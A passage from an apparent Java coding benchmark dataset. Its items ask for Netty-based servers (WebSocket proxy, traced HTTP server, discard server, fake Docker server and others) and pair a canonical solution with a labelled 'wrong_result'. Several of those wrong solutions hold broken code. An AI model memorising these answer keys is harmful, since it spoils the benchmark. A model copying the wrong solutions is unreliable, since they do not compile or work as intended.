    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class PortUnificationServer {\n\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8080\"));\n\n    public static void main(String[] args) throws Exception {\n        SelfSignedCertificate ssc = new SelfSignedCertificate();\n        final SslContext sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey())\n            .build();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(new PortUnificationServerHandler(sslCtx));\n                }\n            });\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class PortUnificationServer {\n    public static final int PORT = 8080;\n\n    public static void main(String[] args) throws Exception {\n        // Generate self-signed SSL certificate\n        String certPath = \"server-cert.pem\";\n        String keyPath = \"server-key.pem\";\n        generateSelfSignedCert(certPath, keyPath);\n\n        // Set up SSL context\n        SslContext sslCtx = SslContextBuilder.forServer(keyPath, certPath)\n                .sslProvider(SslProvider.OPENSSL)\n                .build();\n\n        // Configure the server\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     // Add SSL handler if needed\n                     p.addLast(sslCtx.newHandler(ch.alloc()));\n                     p.addLast(new SimpleChannelInboundHandler<ByteBuf>() {\n                         @Override\n                         protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) throws Exception {\n                             // Handle plaintext or encrypted data\n                             System.out.println(\"Received data: \" + msg.toString(CharsetUtil.UTF_8));\n                             msg.release();\n                         }\n                     });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            // Bind and start to accept incoming connections\n            ChannelFuture f = b.bind(PORT).sync();\n            System.out.println(\"Server started and listening on port \" + PORT + \" (both SSL and plaintext)\");\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private static void generateSelfSignedCert(String certPath, String keyPath) throws Exception {\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n\n        X509Certificate certificate = generateSelfSignedCertificate(keyPair);\n        saveCertificate(certificate, certPath);\n        savePrivateKey(keyPair.getPrivate(), keyPath);\n    }\n\n    private static X509Certificate generateSelfSignedCertificate(KeyPair keyPair) throws Exception {\n        X500Principal principal = new X500Principal(\"CN=localhost, OU=Netty, O=Example, L=Example, ST=Example, C=US\");\n        X509V3CertificateBuilder builder = new JcaX509v3CertificateBuilder(\n                new X500Name(principal),\n                BigInteger.valueOf(System.currentTimeMillis()),\n                Calendar.getInstance().getTime(),\n                Calendar.getInstance().getTime().getTime() + 365 * 24 * 60 * 60 * 1000,\n                new X500Name(principal),\n                new SubjectPublicKeyInfo(ASN1ObjectIdentifier.getInstance(oid), keyPair.getPublic().getEncoded())\n        );\n        ContentSigner signer = new JcaContentSignerBuilder(\"SHA256withRSA\").build(keyPair.getPrivate());\n        return new JcaX509CertificateConverter().setProvider(\"BC\").build(builder.build(signer));\n    }\n\n    private static void saveCertificate(X509Certificate certificate, String path) throws Exception {\n        try (FileOutputStream fos = new FileOutputStream(path)) {\n            fos.write(certificate.getEncoded());\n        }\n    }\n\n    private static void savePrivateKey(PrivateKey privateKey, String path) throws Exception {\n        try (FileOutputStream fos = new FileOutputStream(path)) {\n            fos.write(privateKey.getEncoded());\n        }\n    }\n}"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Implement a WebSocket proxy server using Java Netty framework to handle WebSocket connections and manage client-server communication.\n\nClass Description: WebsocketProxy is a class that implements a Proxy interface and provides functionality to start a WebSocket server on a specified port. It handles WebSocket protocol upgrades, HTTP requests, and manages client connections with proper resource cleanup.\n\nAttributes:\n- None (All variables are local to methods)\n\nMethods:\n- start(int port) -> void - Starts the WebSocket server on the specified port. Initializes event loop groups, configures server bootstrap with appropriate channel and handlers, binds to the port, and manages server lifecycle including graceful shutdown. Throws InterruptedException if the thread is interrupted during server operation.\n\nInput:\n- port: int - The port number on which the WebSocket server should listen for incoming connections\n\nOutput:\n- None (Void method, but it will start a server that listens on the specified port and handles WebSocket connections)\n\nNote: The implementation should include proper error handling, resource management, and support for both NIO and Epoll transport mechanisms based on system availability. The server should handle WebSocket protocol upgrades, HTTP codecs, chunked writes, and idle connection management.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.epoll.Epoll;\nimport io.netty.channel.epoll.EpollEventLoopGroup;\nimport io.netty.channel.epoll.EpollServerSocketChannel;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport org.nico.ratel.landlords.print.SimplePrinter;\nimport org.nico.ratel.landlords.robot.RobotDecisionMakers;\n\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.TimeUnit;\n\npublic class WebsocketProxy implements Proxy {\n\n    @Override\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup parentGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        EventLoopGroup childGroup = Epoll.isAvailable() ? new EpollEventLoopGroup() : new NioEventLoopGroup();\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap()\n                    .group(parentGroup, childGroup)\n                    .channel(Epoll.isAvailable() ? EpollServerSocketChannel.class : NioServerSocketChannel.class)\n                    .localAddress(new InetSocketAddress(port))\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline()\n                                    .addLast(new IdleStateHandler(60 * 30, 0, 0, TimeUnit.SECONDS))\n                                    .addLast(new HttpServerCodec())\n                                    .addLast(new ChunkedWriteHandler())\n                                    .addLast(new HttpObjectAggregator(8192))\n                                    .addLast(\"ws\", new WebSocketServerProtocolHandler(\"/ratel\"))\n                                    .addLast(new WebsocketTransferHandler());\n                        }\n                    });\n\n            ChannelFuture f = bootstrap.bind().sync();\n\n            SimplePrinter.serverLog(\"The websocket server was successfully started on port \" + port);\n            RobotDecisionMakers.init();\n            f.channel().closeFuture().sync();\n        } finally {\n            parentGroup.shutdownGracefully();\n            childGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class WebsocketProxy implements Proxy {\n    public void start(int port) throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(Epoll.isAvailable() ? EpollSocketChannel.class : NioSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new HttpServerCodec());\n                     p.addLast(new HttpObjectAggregator(65536));\n                     p.addLast(new IdleStateHandler(0, 0, 10, TimeUnit.SECONDS));\n                     p.addLast(new WebSocketServerProtocolHandler(\"/ws\"));\n                     p.addLast(new SimpleChannelInboundHandler<WebSocketFrame>() {\n                         @Override\n                         public void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {\n                             if (frame instanceof TextWebSocketFrame) {\n                                 String request = ((TextWebSocketFrame) frame).text();\n                                 System.out.println(\"Received: \" + request);\n                                 ctx.writeAndFlush(new TextWebSocketFrame(\"Echo: \" + request));\n                             } else if (frame instanceof CloseWebSocketFrame) {\n                                 ctx.close();\n                             }\n                         }\n                         @Override\n                         public void handlerAdded(ChannelHandlerContext ctx) {\n                             // Handle connection\n                         }\n                         @Override\n                         public void handlerRemoved(ChannelHandlerContext ctx) {\n                             // Handle disconnection\n                         }\n                     });\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Implement a Netty-based HTTP server in Java that handles incoming HTTP requests with tracing capabilities for specific endpoints.\n\nClass Description: NettyHttpServer is a TCP server implementation using Netty framework that listens for HTTP requests. It provides tracing functionality for specific endpoints (\"/unsampled\" and \"/traced\") while serving regular requests for other paths. The server manages its lifecycle through start and stop methods.\n\nAttributes:\n- bossGroup: [EventLoopGroup] - Handles incoming connections (accept loop)\n- workerGroup: [EventLoopGroup] - Handles I/O operations for established connections\n\nMethods:\n- startServer() -> [int] - Starts the HTTP server on an available port, returns the bound port number\n- stopServer() -> [void] - Shuts down the server gracefully, releasing all resources\n- TracingDispatchHandler (inner class) - Handles request tracing for specific endpoints\n  - channelRead(ChannelHandlerContext, Object) -> [void] - Processes incoming messages and routes them to appropriate tracing handlers\n  - write(ChannelHandlerContext, Object, ChannelPromise) -> [void] - Processes outgoing messages with tracing context",
    "Canonical_solution": "import brave.Tracing;\nimport brave.baggage.BaggagePropagation;\nimport brave.baggage.BaggagePropagationConfig.SingleBaggageField;\nimport brave.propagation.B3Propagation;\nimport brave.sampler.Sampler;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelDuplexHandler;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.AttributeKey;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public int startServer() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new TracingDispatchHandler());\n                    p.addLast(new HelloWorldHandler());\n                }\n            });\n\n        Channel ch = b.bind(0).sync().channel();\n        return ((InetSocketAddress) ch.localAddress()).getPort();\n    }\n\n    public void stopServer() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n\n    static class TracingDispatchHandler extends ChannelDuplexHandler {\n        static final AttributeKey<String> URI_ATTRIBUTE = AttributeKey.valueOf(\"uri\");\n\n        final ChannelDuplexHandler unsampled = NettyHttpTracing.create(\n            Tracing.newBuilder().sampler(Sampler.NEVER_SAMPLE).build()\n        ).serverHandler();\n        final ChannelDuplexHandler traced = NettyHttpTracing.create(\n            Tracing.newBuilder()\n                .propagationFactory(BaggagePropagation.newFactoryBuilder(B3Propagation.FACTORY)\n                .build()\n        ).serverHandler();\n\n        @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (!(msg instanceof HttpRequest)) {\n                ctx.fireChannelRead(msg);\n                return;\n            }\n            String uri = ((HttpRequest) msg).uri();\n            if (\"/unsampled\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                unsampled.channelRead(ctx, msg);\n            } else if (\"/traced\".equals(uri)) {\n                ctx.channel().attr(URI_ATTRIBUTE).set(uri);\n                traced.channelRead(ctx, msg);\n            } else {\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise prm) throws Exception {\n            String uri = ctx.channel().attr(URI_ATTRIBUTE).get();\n            if (uri == null) {\n                ctx.write(msg, prm);\n                return;\n            }\n            if (\"/unsampled\".equals(uri)) {\n                unsampled.write(ctx, msg, prm);\n            } else if (\"/traced\".equals(uri)) {\n                traced.write(ctx, msg, prm);\n            } else {\n                ctx.write(msg, prm);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyHttpServer {\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n    private Channel channel;\n    private int port;\n\n    public NettyHttpServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n    }\n\n    public int startServer() {\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new HttpClientCodec());\n                        pipeline.addLast(new HttpObjectAggregator(65536));\n                        pipeline.addLast(new TracingDispatchHandler());\n                        pipeline.addLast(new HttpResponseHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 1024)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(0).sync();\n            port = future.channel().localAddress().getPort();\n            channel = future.channel();\n            return port;\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new RuntimeException(\"Failed to start server\", e);\n        }\n    }\n\n    public void stopServer() {\n        if (channel != null) {\n            channel.close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private class TracingDispatchHandler extends ChannelInboundHandlerAdapter implements ChannelOutboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                String path = request.uri();\n                if (\"/traced\".equals(path) || \"/unsampled\".equals(path)) {\n                    System.out.println(\"Tracing request to \" + path);\n                }\n                ctx.fireChannelRead(msg);\n            }\n        }\n\n        @Override\n        public void write(ChannelHandlerContext ctx, Object msg, ChannelPromise promise) throws Exception {\n            if (msg instanceof FullHttpResponse) {\n                FullHttpResponse response = (FullHttpResponse) msg;\n                System.out.println(\"Writing response: \" + response.content().toString(CharsetUtil.UTF_8));\n            }\n            super.write(ctx, msg, promise);\n        }\n    }\n\n    private class HttpResponseHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n            FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"text/plain\");\n            response.content().writeBytes(\"Hello World\");\n            ctx.writeAndFlush(response);\n        }\n    }\n}"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests, with optional SSL support for secure communication.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts client connections, and processes incoming data (discarding it in this example). It supports optional SSL encryption and uses NIO for non-blocking I/O operations.\n\nAttributes:\n- SSL: [boolean] - Flag indicating whether SSL encryption should be enabled\n- PORT: [int] - The port number on which the server will listen for connections\n- sslCtx: [SslContext] - SSL context for secure communication (nullable)\n\nMethods:\n- main: [main(String[] args)] -> void - Entry point that configures and starts the Netty server\n  - args: [String[]] - Command line arguments (not directly used)\n  - Throws: Exception - For various Netty and SSL related exceptions\n- initChannel: [initChannel(SocketChannel ch)] -> void - Initializes the channel pipeline for each new connection (inner method of ChannelInitializer)\n  - ch: [SocketChannel] - The socket channel being initialized\n  - Configures SSL handler (if enabled) and adds the main server handler to the pipeline",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class DiscardServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8009\"));\n\n    public static void main(String[] args) throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) {\n                     ChannelPipeline p = ch.pipeline();\n                     if (sslCtx != null) {\n                         p.addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     p.addLast(new DiscardServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class DiscardServer {\n    private final boolean SSL;\n    private final int PORT;\n    private SslContext sslCtx;\n\n    public DiscardServer(boolean ssl, int port) {\n        this.SSL = ssl;\n        this.PORT = port;\n    }\n\n    public static void main(String[] args) throws Exception {\n        if (args.length < 2) {\n            throw new IllegalArgumentException(\"Usage: java DiscardServer <port> <ssl>\");\n        }\n        int port = Integer.parseInt(args[0]);\n        boolean ssl = Boolean.parseBoolean(args[1]);\n        new DiscardServer(ssl, port).run();\n    }\n\n    private void run() throws Exception {\n        initSSLContext();\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     if (SSL) {\n                         ch.pipeline().addLast(sslCtx.newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new DiscardHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    private void initSSLContext() throws Exception {\n        if (SSL) {\n            sslCtx = SslContextBuilder.forServer(\"path/to/cert.pem\", \"path/to/privkey.pem\")\n                                      .protocols(\"TLSv1.2\")\n                                      .ciphersuite(\"TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\")\n                                      .build();\n        } else {\n            sslCtx = null;\n        }\n    }\n\n    private class DiscardHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 231,
    "Instruction": "Task Description: Create a Java class that implements a fake Docker server using Netty TCP server technology to intercept and record HTTP requests while responding with empty JSON responses.\n\nClass Description: The FakeDockerServer class simulates a Docker API server for testing purposes. It captures incoming HTTP requests and responds with a static JSON response. The server uses Netty's NIO event loop groups for handling connections and implements graceful shutdown capabilities.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- parent: NioEventLoopGroup - The parent event loop group for accepting connections\n- child: NioEventLoopGroup - The child event loop group for handling connections\n- requests: List<HttpRequest> - Stores all received HTTP requests for inspection\n- channel: Channel - The server's communication channel\n\nMethods:\n- FakeDockerServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> void - Starts the server and configures request handling pipeline\n- stop() -> void - Stops the server and releases resources gracefully\n- getRequests() -> List<HttpRequest> - Returns the list of captured HTTP requests",
    "Canonical_solution": "import com.github.dockerjava.api.DockerClient;\nimport com.github.dockerjava.core.DefaultDockerClientConfig;\nimport com.github.dockerjava.core.DockerClientBuilder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpResponse;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpContent;\nimport io.netty.handler.codec.http.HttpRequest;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.CharsetUtil;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_LENGTH;\nimport static io.netty.handler.codec.http.HttpHeaderNames.CONTENT_TYPE;\nimport static io.netty.handler.codec.http.HttpResponseStatus.OK;\nimport static io.netty.handler.codec.http.HttpVersion.HTTP_1_1;\n\npublic class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests = new ArrayList<>();\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup();\n        this.child = new NioEventLoopGroup();\n    }\n\n    public void start() throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(parent, child)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel socketChannel) throws Exception {\n                    ChannelPipeline pipeline = socketChannel.pipeline();\n                    pipeline.addLast(\"codec\", new HttpServerCodec());\n                    pipeline.addLast(\"httpHandler\", new SimpleChannelInboundHandler<Object>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext context, Object message) throws Exception {\n                            if (message instanceof HttpRequest) {\n                                HttpRequest request = (HttpRequest) message;\n                                requests.add(request);\n                            }\n\n                            if (message instanceof HttpContent) {\n                                FullHttpResponse response = new DefaultFullHttpResponse(HTTP_1_1, OK, Unpooled.copiedBuffer(\"{}\", CharsetUtil.UTF_8));\n                                response.headers().set(CONTENT_TYPE, \"application/json; charset=UTF-8\");\n                                response.headers().set(CONTENT_LENGTH, response.content().readableBytes());\n                                context.writeAndFlush(response);\n                            }\n                        }\n                    });\n                }\n            });\n\n        channel = bootstrap.bind(port).syncUninterruptibly().channel();\n    }\n\n    public void stop() throws Exception {\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n        channel.closeFuture().sync();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class FakeDockerServer {\n    private final int port;\n    private final NioEventLoopGroup parent;\n    private final NioEventLoopGroup child;\n    private final List<HttpRequest> requests;\n    private Channel channel;\n\n    public FakeDockerServer(int port) {\n        this.port = port;\n        this.parent = new NioEventLoopGroup(1);\n        this.child = new NioEventLoopGroup();\n        this.requests = new ArrayList<>();\n    }\n\n    public void start() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(parent, child)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<Channel>() {\n             @Override\n             protected void initChannel(Channel ch) {\n                 ch.pipeline().addLast(\n                     new LoggingHandler(LogLevel.INFO),\n                     new HttpClientCodec(),\n                     new HttpObjectAggregator(1048576),\n                     new HttpRequestCaptureHandler()\n                 );\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture f = b.bind(port).syncUninterruptibly();\n        this.channel = f.channel();\n    }\n\n    public void stop() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        parent.shutdownGracefully();\n        child.shutdownGracefully();\n    }\n\n    public List<HttpRequest> getRequests() {\n        return requests;\n    }\n\n    private class HttpRequestCaptureHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof FullHttpRequest) {\n                FullHttpRequest request = (FullHttpRequest) msg;\n                requests.add(request);\n                FullHttpResponse response = new DefaultFullHttpResponse(\n                    HttpVersion.HTTP_1_1, HttpResponseStatus.OK,\n                    Unpooled.wrappedBuffer(\"{}\".getBytes(StandardCharsets.UTF_8))\n                );\n                response.headers().set(HttpHeaderNames.CONTENT_TYPE, \"application/json\");\n                response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());\n                ctx.writeAndFlush(response);\n            }\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 233,
    "Instruction": "Task Description: Create a Java class that implements a UDP server using Netty framework for backup communication in a distributed system. The server should handle incoming UDP packets, decode them, and process messages while managing resources efficiently.\n\nClass Description: BackupServer is an AutoCloseable class that establishes a Netty-based UDP server for backup communication. It manages network connections, message handling, and graceful shutdown procedures.\n\nAttributes:\n- commonParameter: [CommonParameter] - Configuration parameters for the backup server\n- port: [int] - Port number to bind the UDP server\n- backupManager: [BackupManager] - Manager for backup operations\n- channel: [Channel] - Netty channel for UDP communication\n- shutdown: [boolean] - Flag indicating server shutdown status\n- executor: [ExecutorService] - Thread executor for server operations\n\nMethods:\n- initServer(): [void]() -> [void] - Initializes and starts the backup server in a separate thread if conditions are met\n- start(): [void]() throws [Exception] - Configures and starts the Netty UDP server with proper handlers\n- close(): [void]() -> [void] - Implements AutoCloseable to gracefully shutdown the server and release resources\n\nConstructor:\n- BackupServer([BackupManager backupManager]) - Creates a new instance with the specified BackupManager",
